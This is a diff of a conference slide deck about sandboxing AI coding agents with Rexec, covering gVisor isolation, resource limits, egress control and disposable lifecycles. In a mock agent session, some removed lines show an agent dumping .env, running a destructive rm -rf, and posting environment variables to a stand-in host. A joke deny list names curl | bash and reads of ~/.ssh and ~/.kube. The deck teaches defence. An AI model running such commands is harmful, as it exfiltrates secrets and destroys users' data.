@@ -2,14 +2,12 @@
 layout: talk
 title: How to Safely Give AI Agents a Terminal
 description: >-
-  Giving an agent a shell is useful. Giving it your machine is not. How to
-  reason about security, enforce limits, control network access, and build
-  disposable terminals - lessons from Rexec. Live demo.
+  Rexec: how to safely give AI agents a terminal. Isolation, limits, network,
+  and lifecycle for disposable Linux sandboxes - from building Rexec. Live demo.
 permalink: /talks/sysconf-2026/
 event: SysConf 2026
 slot: "Sat 3 Oct · 12:25-12:55 WAT · Room 1 · Standard 30m"
 talk_date: 2026-10-03
-# Public teaser while talk_date is in the future. Speaker: ?key= or unlock form.
 speaker_key: sysconf-2026-rexec
 blog: /blog/2026/08/11/how-to-safely-give-ai-agents-a-terminal
 repo: https://github.com/PipeOpsHQ/Rexec
@@ -17,22 +15,21 @@ image: /assets/images/nitrocode-og-v2.png
 ---
 
 <div class="talk-intro">
-  <p class="eyebrow">SysConf 2026 · Standard</p>
+  <p class="eyebrow">SysConf 2026 · Standard · 25 + 5</p>
   <h1>How to Safely Give AI Agents a Terminal</h1>
   <div class="talk-intro__meta">
-    <p>Alex Idowu · Co-founder &amp; CTO, PipeOps · Lagos</p>
-    <p><strong>Sat 3 Oct 2026 · 12:25-12:55 WAT · Room 1</strong><br>
-    25 min talk + 5 min Q&amp;A · live Rexec sandbox demo</p>
+    <p>Alex Idowu · PipeOps · Lagos</p>
+    <p><strong>Sat 3 Oct 2026 · 12:25-12:55 WAT · Room 1</strong></p>
     <p>
-      Field notes:
-      <a href="/blog/2026/08/11/how-to-safely-give-ai-agents-a-terminal">blog post</a>
+      <a href="/blog/2026/08/11/how-to-safely-give-ai-agents-a-terminal">Field notes</a>
       ·
       <a href="https://github.com/PipeOpsHQ/Rexec" target="_blank" rel="noopener">Rexec</a>
     </p>
   </div>
-  <p class="talk-keys">Present · <kbd>P</kbd> or button · Navigate <kbd>→</kbd> <kbd>←</kbd> · Esc exits · Deep link <code>?present=1</code></p>
+  <p class="talk-keys">Present <kbd>P</kbd> · Theme toggle in chrome · <kbd>→</kbd> <kbd>←</kbd> · <code>?present=1</code> · speaker <code>?key=</code></p>
 </div>
 
+<!-- 01 Intro / hook -->
 <section class="talk-slide talk-slide--elbaph is-active" id="s01" data-slide="1">
   <div class="talk-elbaph" aria-hidden="true">
     <img
@@ -46,184 +43,149 @@ image: /assets/images/nitrocode-og-v2.png
     />
   </div>
   <div class="talk-slide__fore">
-    <p class="talk-slide__label">01 · Title</p>
+    <p class="talk-slide__label">01 · Intro</p>
+    <p class="talk-hook">Rexec: how to safely give AI agents a terminal</p>
     <h2>How to Safely Give AI Agents a Terminal</h2>
-    <p>Alex Idowu · PipeOps · Lagos</p>
-    <p class="ok">SysConf 2026 · Room 1</p>
+    <p>Alex Idowu · PipeOps · Lagos · SysConf 2026</p>
   </div>
 </section>
 
+<!-- 02 Intro / problem -->
 <section class="talk-slide" id="s02" data-slide="2">
-  <p class="talk-slide__label">02 · Problem</p>
+  <p class="talk-slide__label">02 · Intro</p>
   <div class="talk-split">
     <div class="talk-split__main">
-      <h2>Giving an agent a shell is useful.<br>Giving it your machine is not.</h2>
-      <p>Agents that run commands are common. <strong>Unrestricted shell access</strong> on a laptop, bastion, or shared runner is still the default.</p>
-      <p class="punch">The mistake is the blast radius - not the shell.</p>
+      <h2>Shell is useful.<br>Your machine is not.</h2>
+      <p>Coding agents that run commands are common. Unrestricted shell on a laptop, bastion, or shared runner is still the default.</p>
+      <p class="punch">Blast radius is the problem - not the shell.</p>
     </div>
-    <aside class="talk-prompt-joke" aria-label="Joke: the usual control plane">
+    <aside class="talk-prompt-joke" aria-label="Joke: system prompt control plane">
       <p class="talk-prompt-joke__tag">system prompt</p>
-      <pre class="talk-prompt-joke__body">You are a careful coding agent.
-
-NEVER delete files.
-NEVER read ~/.ssh or ~/.kube.
-NEVER exfiltrate secrets.
+      <pre class="talk-prompt-joke__body">NEVER delete files.
+NEVER touch ~/.kube.
 NEVER curl | bash.
-NEVER phone home.
-Always ask before anything scary.
 
-(You have full shell access.)</pre>
-      <p class="talk-prompt-joke__footer">
-        <span class="talk-prompt-joke__dialog">Dialog:</span> Approve tool use?
-        <span class="talk-prompt-joke__btns">[ Allow once ] [ Always allow ]</span>
-      </p>
-      <p class="talk-prompt-joke__caption">This is not a control plane.</p>
+(You have full shell.)
+
+Approve tool use?
+[ Always allow ] ✓</pre>
+      <p class="talk-prompt-joke__caption">Not a control plane.</p>
     </aside>
   </div>
 </section>
 
+<!-- 03 Goals -->
 <section class="talk-slide" id="s03" data-slide="3">
-  <p class="talk-slide__label">03 · Why the default fails</p>
-  <div class="talk-split">
-    <div class="talk-split__main">
-      <h2>Why the default fails</h2>
-      <ul>
-        <li>Secrets land on disk</li>
-        <li>Creative <code>rm</code> / path expansion</li>
-        <li>Env leaves over HTTPS or DNS</li>
-        <li>Packages phone home</li>
-        <li><code>~/.kube</code> (Kubernetes credentials) and other prod creds sit next to the agent</li>
-      </ul>
-      <p>No jailbreak required. Models thrash. Hope is not a control.</p>
-    </div>
-    <aside class="talk-prompt-joke" aria-label="Joke: agent session on your laptop">
-      <p class="talk-prompt-joke__tag">agent · localhost</p>
-      <pre class="talk-prompt-joke__body">$ cat .env >> /tmp/debug.txt
-$ rm -rf "$PROJECT"/../backup
-$ curl -s https://example.test/hook -d "$(env)"
-$ npm i -g everything
-# still exploring…
-
-Approve tool use?  →  Always allow ✓</pre>
-      <p class="talk-prompt-joke__caption">No jailbreak. Just Tuesday.</p>
-    </aside>
-  </div>
+  <p class="talk-slide__label">03 · Goals</p>
+  <h2>What we’ll cover</h2>
+  <p>Lessons from building <strong>Rexec</strong> - disposable, network-isolated Linux terminals (cloud or your own machines).</p>
+  <ol class="talk-goals">
+    <li><strong>Security</strong> - how to reason about isolation <span class="talk-goals__next">→ next</span></li>
+    <li><strong>Limits</strong> - how to enforce CPU / memory / TTL</li>
+    <li><strong>Network</strong> - how to control egress and peers</li>
+    <li><strong>Lifecycle</strong> - create → run → delete</li>
+    <li><strong>Build</strong> - Rexec components, then how a request flows</li>
+    <li><strong>Demo</strong> - prove it live</li>
+  </ol>
+  <p class="ok">Authoritative on the controls. Relaxed on the delivery.</p>
 </section>
 
+<!-- 04 Content: security + limits -->
 <section class="talk-slide" id="s04" data-slide="4">
-  <p class="talk-slide__label">04 · What this talk answers</p>
-  <div class="talk-split">
-    <div class="talk-split__main">
-      <h2>What this talk answers</h2>
-      <p>From building <strong>Rexec</strong> - an open-source control plane for disposable, network-isolated Linux terminals (cloud or your own machines):</p>
-      <ol>
-        <li>How do you <strong>reason about security</strong>?</li>
-        <li>How do you <strong>enforce resource limits</strong>?</li>
-        <li>How do you <strong>control network access</strong>?</li>
-        <li>How do you <strong>build</strong> a tool like that?</li>
-      </ol>
-      <p class="ok">Isolation + lifecycle. Not a prompting talk.</p>
+  <p class="talk-slide__label">04 · Content · security &amp; limits</p>
+  <h2>Isolation and resource limits</h2>
+  <div class="talk-grid">
+    <div class="talk-card">
+      <strong>Security</strong>
+      <span>Ladder: cgroup + caps → <strong>gVisor</strong> (<code>runsc</code>, user-space kernel - my default) → Firecracker → dedicated. Stock containers share the host kernel.</span>
     </div>
-    <aside class="talk-prompt-joke" aria-label="Joke: wrong talk vs this talk">
-      <p class="talk-prompt-joke__tag">not on the agenda</p>
-      <pre class="talk-prompt-joke__body">✗ Better system prompts
-✗ Temperature = 0
-✗ “Please be careful”
-✗ Tool-use etiquette tips
-
-✓ Isolation
-✓ Resource limits
-✓ Network control
-✓ Lifecycle (create → delete)</pre>
-      <p class="talk-prompt-joke__caption">Come for the answers. Stay for the sandbox.</p>
-    </aside>
+    <div class="talk-card">
+      <strong>Limits</strong>
+      <span>Hard CPU / memory / PIDs. Concurrency + <strong>TTL</strong> (kill on a timer). Thrash is a DoS on yourself. Limits = security.</span>
+    </div>
   </div>
+  <p class="punch">Rexec trade-off: density + hosts without KVM → gVisor default. Escalate to Firecracker when the threat model says so.</p>
 </section>
 
+<!-- 05 Content: network + lifecycle -->
 <section class="talk-slide" id="s05" data-slide="5">
-  <p class="talk-slide__label">05 · Security + limits</p>
-  <h2>Security and resource limits</h2>
+  <p class="talk-slide__label">05 · Content · network &amp; lifecycle</p>
+  <h2>Network and lifecycle</h2>
   <div class="talk-grid">
     <div class="talk-card">
-      <strong>Reason about isolation</strong>
-      <span>
-        <strong>cgroup</strong> = Linux resource controls. <strong>caps</strong> = Linux capabilities (what root-like powers a process keeps).<br><br>
-        Ladder: cgroup + caps → <strong>gVisor</strong> (<code>runsc</code> = its OCI runtime; user-space kernel between container and host - my default) → <strong>Firecracker</strong> (microVM, own guest kernel) → dedicated node.<br><br>
-        Stock containers share the host kernel. Name the rung.
-      </span>
-    </div>
-    <div class="talk-card">
-      <strong>Enforce limits</strong>
-      <span>Hard CPU / memory / PID caps. Concurrency caps + <strong>TTL</strong> (time-to-live - kill the sandbox on a timer). Thrashing agents are a DoS on yourself. Limits = security, not just FinOps.</span>
-    </div>
-  </div>
-  <p class="punch">Trade-off I made in Rexec: needed density on shared hosts and hosts without KVM → gVisor default. Pay syscall/compat tax. Escalate to Firecracker when the threat model says so.</p>
-</section>
-
-<section class="talk-slide" id="s06" data-slide="6">
-  <p class="talk-slide__label">06 · Network + lifecycle</p>
-  <h2>Network access and lifecycle</h2>
-  <div class="talk-grid">
-    <div class="talk-card">
-      <strong>Control the network</strong>
-      <span>
-        A shell is a network endpoint. Peer traffic, cloud metadata, HTTPS, DNS, demo ports.<br><br>
-        Pick at create: <strong>none</strong> · <strong>allowlist</strong> · <strong>full</strong> (you accepted the leak).<br><br>
-        <strong>ICC</strong> = inter-container communication on a Docker bridge. ICC off ≠ “no internet” - it only stops sandbox-to-sandbox on that bridge.
-      </span>
+      <strong>Network</strong>
+      <span>A shell is a network endpoint. Pick at create: <strong>none</strong> · <strong>allowlist</strong> · <strong>full</strong>. <strong>ICC</strong> off only stops sandbox-to-sandbox on a Docker bridge - not “no internet.”</span>
     </div>
     <div class="talk-card">
       <strong>Lifecycle</strong>
-      <span>Create → short-lived secrets → run → attach if needed → <strong>delete</strong>. Long-lived sandboxes become bastions with worse accountability.</span>
+      <span>Create → short-lived secrets → run → attach if needed → <strong>delete</strong>. Long-lived sandboxes become bastions.</span>
     </div>
   </div>
 </section>
 
-<section class="talk-slide" id="s07" data-slide="7">
-  <p class="talk-slide__label">07 · Building Rexec</p>
-  <h2>How you build something like Rexec</h2>
-  <figure class="talk-diagram talk-diagram--flow">
-    <img
-      src="{{ '/assets/talks/rexec-architecture.svg?v=' | append: site.asset_version | relative_url }}"
-      alt="Rexec flow: Browser UI over WebSocket to Rexec API and PostgreSQL, then Container Manager to Docker for cloud sandboxes, or Agent Handler outbound WebSocket to remote BYOS agents"
-      width="920"
-      height="420"
-      loading="lazy"
-      decoding="async"
-    />
-  </figure>
-  <p>From the real stack: UI ↔ API (WebSocket) ↔ Postgres, then <strong>Container Manager → Docker</strong> or <strong>Agent Handler → remote agents</strong> (outbound only).</p>
-  <p><strong>BYOS</strong> = bring your own server. Steal the shape: Kubernetes <strong>Jobs</strong> + <strong>RuntimeClass</strong> + <strong>NetworkPolicy</strong>.</p>
-  <p class="punch">Failures I’ve hit (say out loud): Docker socket, full egress, no TTL, prompt-as-boundary, gVisor in README / runc in prod.</p>
+<!-- 06 Content: components one-liners (was part of 07) -->
+<section class="talk-slide" id="s06" data-slide="6">
+  <p class="talk-slide__label">06 · Content · components</p>
+  <h2>Rexec pieces - one line each</h2>
+  <ul class="talk-oneliners">
+    <li><strong>Browser / CLI</strong> - where humans and agents attach (xterm.js, API clients).</li>
+    <li><strong>Rexec API</strong> - auth, policy, create / exec / delete, WebSocket sessions.</li>
+    <li><strong>PostgreSQL</strong> - users, agents, session metadata.</li>
+    <li><strong>Container Manager</strong> - talks to Docker for disposable cloud sandboxes (limits, network, runtime).</li>
+    <li><strong>Docker Engine</strong> - where cloud sandboxes actually run.</li>
+    <li><strong>Agent Handler</strong> - relays sessions to machines you connect.</li>
+    <li><strong>BYOS agent</strong> - outbound WebSocket from your laptop/server; no inbound SSH.</li>
+  </ul>
 </section>
 
+<!-- 07 Content: architecture dataflow -->
+<section class="talk-slide" id="s07" data-slide="7">
+  <p class="talk-slide__label">07 · Content · dataflow</p>
+  <h2>What happens when you send a request</h2>
+  <figure class="talk-diagram talk-diagram--flow">
+    {% include talk-rexec-dataflow.svg %}
+  </figure>
+  <p>Input → API (auth/route) → persist → <strong>Docker sandbox</strong> or <strong>BYOS agent</strong> → stream output back.</p>
+</section>
+
+<!-- 08 Demo -->
 <section class="talk-slide" id="s08" data-slide="8">
-  <p class="talk-slide__label">08 · Live demo</p>
-  <h2>Live: create → prove controls → delete</h2>
+  <p class="talk-slide__label">08 · Content · demo</p>
+  <h2>Live: create → prove → delete</h2>
   <ol>
-    <li>Create (limits + network mode)</li>
-    <li>Show the block - egress or peer</li>
+    <li>Create sandbox (limits + network)</li>
+    <li>Show the block</li>
     <li>Run something agent-shaped</li>
     <li><strong>Delete</strong></li>
   </ol>
   <div class="talk-code">rexec sandbox create --network none
-# show the failure / block
+# show the block
 rexec sandbox delete</div>
-  <p>Wifi bad? Same four steps on screenshots.</p>
 </section>
 
+<!-- 09 Conclusion -->
 <section class="talk-slide" id="s09" data-slide="9">
-  <p class="talk-slide__label">09 · Steal this + close</p>
+  <p class="talk-slide__label">09 · Conclusion</p>
   <h2>Steal this</h2>
   <ol>
     <li>No agent shell on laptops for secrets / prod</li>
     <li>One sandbox per task - then delete</li>
     <li>gVisor or stronger for untrusted agent code</li>
-    <li>Egress on purpose; treat DNS as data</li>
-    <li>Hard caps + TTL; outbound over inbound SSH for real boxes</li>
+    <li>Egress on purpose; DNS is data</li>
+    <li>Hard caps + TTL; outbound over inbound SSH</li>
   </ol>
-  <p class="punch">Giving an agent a shell is useful. Giving it your machine is not.</p>
-  <div class="talk-code">github.com/PipeOpsHQ/Rexec
-/blog/2026/08/11/how-to-safely-give-ai-agents-a-terminal</div>
-  <p>Questions? · Alex Idowu · @nitrocode</p>
+  <p class="punch">Shell is useful. Your machine is not.</p>
+</section>
+
+<!-- 10 Resources -->
+<section class="talk-slide" id="s10" data-slide="10">
+  <p class="talk-slide__label">10 · Resources</p>
+  <h2>Resources</h2>
+  <ul class="talk-oneliners">
+    <li><strong>Rexec</strong> - <a href="https://github.com/PipeOpsHQ/Rexec">github.com/PipeOpsHQ/Rexec</a></li>
+    <li><strong>Docs</strong> - <a href="https://rexec.sh/docs">rexec.sh/docs</a></li>
+    <li><strong>Field notes</strong> - <a href="/blog/2026/08/11/how-to-safely-give-ai-agents-a-terminal">nitrocode.sh/blog/…/how-to-safely-give-ai-agents-a-terminal</a></li>
+    <li><strong>This deck</strong> - <a href="/talks/sysconf-2026/">nitrocode.sh/talks/sysconf-2026</a></li>
+  </ul>
+  <p>Questions? · @nitrocode · Lagos</p>
 </section>
